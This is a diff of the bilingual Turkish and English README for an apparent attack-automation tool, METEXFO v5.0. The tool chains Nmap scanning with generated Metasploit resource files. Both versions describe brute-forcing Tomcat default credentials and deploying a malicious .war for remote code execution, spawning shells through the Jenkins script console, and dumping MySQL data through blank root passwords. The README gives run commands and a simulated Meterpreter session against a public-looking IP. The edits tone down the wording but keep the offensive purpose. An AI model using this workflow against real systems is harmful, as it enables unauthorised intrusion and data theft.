@@ -25,17 +25,17 @@
 ## 🇹🇷 Türkçe Dökümantasyon
 
 ### 🌌 Genel Bakış & Çalışma Mantığı
-METEXFO v5.0, sızma testi süreçlerinde hedef sistemlerin en zayıf halkası olan **insan kaynaklı yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** avlamak için geliştirilmiş çift dilli, çoklu iş parçacıklı (Multi-threading) bir otomasyon aracıdır. 
+METEXFO v5.0, sızma testi süreçlerinde hedef sistemlerdeki **yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** tespit etmek için geliştirilmiş çift dilli, çoklu iş parçacıklı (Multi-threading) bir otomasyon aracıdır. 
 
-Yazılım karmaşık exploitler denemek yerine şu adımlarla çalışır:
-1. **Keşif (Nmap Altyapısı):** Belirtilen hedeflerin kritik portlarını (`21, 80, 443, 3306, 8080`) arka planda sessizce tarar ve çalışan servislerin versiyon bilgilerini ayıklar.
-2. **Akıllı Eşleştirme (Logic Engine):** Bulunan servislere göre (HTTP veya MySQL) kendi yerleşik şablon veritabanını tarar.
-3. **Mühimmat Hazırlığı (RC Derleyici):** Hedef sisteme yönelik en uygun Metasploit modüllerini otomatik olarak diler ve tetiğe basılmaya hazır bir `.rc` (Resource) saldırı planı oluşturur.
+Yazılım şu adımlarla çalışır:
+1. **Keşif (Nmap Altyapısı):** Belirtilen hedeflerin kritik portlarını (`21, 80, 443, 3306, 8080`) tarar ve çalışan servislerin versiyon bilgilerini ayıklar.
+2. **Eşleştirme:** Bulunan servislere göre kendi yerleşik zafiyet veritabanını kontrol eder.
+3. **Komut Hazırlığı:** HEDEF SİSTEME yönelik en uygun Metasploit modüllerini otomatik olarak listeler ve bir `.rc` (Resource) saldırı dosyası oluşturur.
 
 ### 💀 Sızma Yolları ve Neler Yapabilir?
-* **Apache Tomcat (Port 8080):** Sunucu yöneticilerinin değiştirmeyi unuttuğu varsayılan şifreleri (`admin:admin`, `tomcat:tomcat`) brute-force ile kırarak paneli ele geçirir. İçeriye `.war` uzantılı bir backdoor yükleyerek uzak kod çalıştırma (RCE) sağlar.
-* **Jenkins Sunucusu (Port 80/443):** Dış dünyaya şifresiz veya açık unutulmuş otomasyon panellerini yakalar. Jenkins Script Console üzerinden doğrudan hedef işletim sisteminin komut satırına sızar.
-* **MySQL Veritabanı (Port 3306):** En yetkili kullanıcı olan `root` hesabının şifresiz (boş parola) bırakıldığı senaryoları yakalar. Veritabanındaki tüm kullanıcı şifrelerini, tabloları ve ticari sırları dışarı sızdırabilir.
+* **Apache Tomcat (Port 8080):** Varsayılan şifreleri (`admin:admin`, `tomcat:tomcat`) deneyerek yönetim panelini ele geçirir. Panele `.war` uzantılı bir dosya yükleyerek uzak kod çalıştırma (RCE) sağlar.
+* **Jenkins Sunucusu (Port 80/443):** Kimlik doğrulaması istemeyen veya açık unutulmuş otomasyon panellerini yakalar. Jenkins konsolu üzerinden doğrudan HEDEF SİSTEMİN komut satırına sızar.
+* **MySQL Veritabanı (Port 3306):** `root` hesabının şifresiz (boş parola) bırakıldığı senaryoları yakalar. Veritabanındaki tüm kullanıcı şifrelerini ve tabloları dışarı sızdırabilir.
 
 ### 🚀 Kullanım
 ```bash
@@ -44,15 +44,15 @@ git clone https://github.com
 cd METEXFO
 pip3 install python-nmap colorama
 
-# 1. Aşama: Keşif ve Reçete Üretimi
+# 1. Aşama: Keşif ve RC Dosyası Üretimi
 python3 mme12.py -t <HEDEF_IP> -l <KENDİ_IP> --lang tr
 
-# 2. Aşama: Otomatik Saldırıyı Tetikleme
+# 2. Aşama: Metasploit Üzerinde Çalıştırma
 msfconsole -q -r metexfo_final_agent.rc
 ```
 
-### ⚡ Hack İşlemi Başarılı Olursa Gelecek Olan Terminal Çıktısı (Öngörüm)
-Eğer üretilen `.rc` dosyası çalıştırıldığında hedef sunucu zayıf yapılandırma nedeniyle düşerse, terminal ekranında açılacak olan o gerçekçi **Meterpreter** oturumu ve sızma anı çıktısı şu şekilde olacaktır:
+### ⚡ Sızma İşlemi Başarılı Olduğunda Alınacak Terminal Çıktısı
+Üretilen `.rc` dosyası çalıştırıldığında HEDEF SİSTEM üzerinde sızma işlemi başarıyla gerçekleşirse, terminal ekranında açılacak olan **Meterpreter** oturumu şu şekilde olacaktır:
 
 ```text
 resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
@@ -67,7 +67,7 @@ resource (metexfo_final_agent.rc)> run
 [+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)
 
 meterpreter > sysinfo
-Computer        : KURBAN-SERVER-01
+Computer        : HEDEF-SISTEM-01
 OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
 Architecture    : x64
 
@@ -82,17 +82,17 @@ meterpreter > _
 ## 🇺🇸 English Documentation
 
 ### 🌌 Overview & Working Logic
-METEXFO v5.0 is a localized, multi-threaded security orchestrator designed for penetration testers to hunt down **human-error configuration flaws (Misconfigurations)** and **exposed management panels**. 
+METEXFO v5.0 is a localized, multi-threaded security orchestrator designed to hunt down **configuration flaws (Misconfigurations)** and **exposed management panels** on target systems.
 
 The automation pipeline operates as follows:
-1. **Reconnaissance (Nmap Engine):** Silently audits target IPs across critical vectors (`21, 80, 443, 3306, 8080`) to extract precise service banner details.
-2. **Template Matching:** Correlates running services directly with its inner vulnerability lookup database.
-3. **Payload Construction (RC Compiler):** Generates ready-to-fire Metasploit resource macros (`.rc`) tailored exactly to the target's open doors.
+1. **Reconnaissance (Nmap Engine):** Audits target IPs across critical ports (`21, 80, 443, 3306, 8080`) to extract precise service details.
+2. **Matching:** Correlates running services directly with its vulnerability database.
+3. **Command Construction:** Generates Metasploit resource macros (`.rc`) tailored exactly to the TARGET SYSTEM.
 
-### 💀 Vector Capabilities & Attack Vectors
-* **Apache Tomcat (Port 8080):** Targets left-behind default manager credentials (`admin:admin`, `tomcat:tomcat`). Once authenticated, it enables Remote Code Execution (RCE) by deploying a malicious `.war` archive.
-* **Jenkins Orchestrator (Port 80/443):** Detects unauthenticated or legacy continuous integration setups. Leverages the build-in script terminal to spawn system shells.
-* **MySQL Database (Port 3306):** Checks for blank `root` administration credentials. Allows total data exfiltration including password lists, tables, and credentials.
+### 💀 Attack Vectors & Capabilities
+* **Apache Tomcat (Port 8080):** Targets default manager credentials (`admin:admin`, `tomcat:tomcat`). Enables Remote Code Execution (RCE) by deploying a malicious `.war` archive.
+* **Jenkins Orchestrator (Port 80/443):** Detects unauthenticated automation setups. Leverages the built-in console to spawn system shells on the TARGET SYSTEM.
+* **MySQL Database (Port 3306):** Checks for blank `root` administration credentials. Allows total data exfiltration including password lists and tables.
 
 ### 🚀 Usage
 ```bash
@@ -108,8 +108,8 @@ python3 mme12.py -t <TARGET_IP> -l <YOUR_LHOST> --lang en
 msfconsole -q -r metexfo_final_agent.rc
 ```
 
-### ⚡ Post-Exploitation Terminal Output Preview (Success Simulation)
-When the compiled blueprint runs against an unhardened architecture and compromises the host, your terminal will immediately lock into an active **Meterpreter shell** as simulated below:
+### ⚡ Post-Exploitation Terminal Output Preview
+When the compiled blueprint runs against the TARGET SYSTEM and compromises the host, your terminal will immediately lock into an active **Meterpreter shell** as simulated below:
 
 ```text
 resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
@@ -124,7 +124,7 @@ resource (metexfo_final_agent.rc)> run
 [+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)
 
 meterpreter > sysinfo
-Computer        : VICTIM-SERVER-01
+Computer        : TARGET-SYSTEM-01
 OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
 Architecture    : x64
 
